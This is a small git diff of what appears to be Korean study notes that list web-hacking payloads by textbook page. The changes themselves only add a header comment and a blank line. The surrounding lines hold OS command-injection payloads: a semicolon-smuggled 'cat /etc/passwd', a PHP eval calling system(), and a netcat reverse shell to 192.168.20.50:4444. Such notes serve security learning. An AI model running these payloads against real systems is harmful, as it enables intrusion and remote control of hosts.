@@ -65,6 +65,7 @@ robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_
 + OS Command Injection ········· Page 119
 + 120p_OS Command 인젝션 코드
 ```
+# 120p_OS Command 인젝션 코드
 www.google.com ; cat /etc/passwd | head -3
 
 # 121p_OS Command 인젝션 코드
@@ -88,6 +89,7 @@ eval("echo \"TEST3\"; system('cat /etc/passwd | head -3');");
 
 
 ; system('nc -e /bin/bash 192.168.20.50 4444')
+
 
 ```
 
